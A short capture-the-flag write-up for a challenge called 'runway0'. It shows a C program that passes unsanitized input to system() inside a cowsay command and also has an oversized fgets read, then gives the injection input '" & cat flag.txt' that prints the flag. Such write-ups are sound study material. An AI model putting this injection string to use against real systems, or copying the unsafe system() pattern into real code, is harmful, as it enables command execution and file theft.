# runway0

This challenge provided the following c progam:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char command[110] = "cowsay \"";
    char message[100];

    printf("Give me a message to say!\n");
    fflush(stdout);

    fgets(message, 0x100, stdin);

    strncat(command, message, 98);
    strncat(command, "\"", 2);

    system(command);
}
```

This challenge has two vulnerabilities. First, that it calls "fgets" with 0x100 = 256 bytes to read in, whereas `message` is 100 bytes. 
The other vulnerability, which is easier to exploit, is that the message is never sanitized, meaning that we can make use of a `"` at the
start of our input to escape the quotes. We can then use the `&` operator to run whatever we want, in my case to `cat` the  flag. So here's my final
interaction with the server:

```
Give me a message to say!
" & cat flag.txt
bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}sh: 2: Syntax error: Unterminated quoted string
```
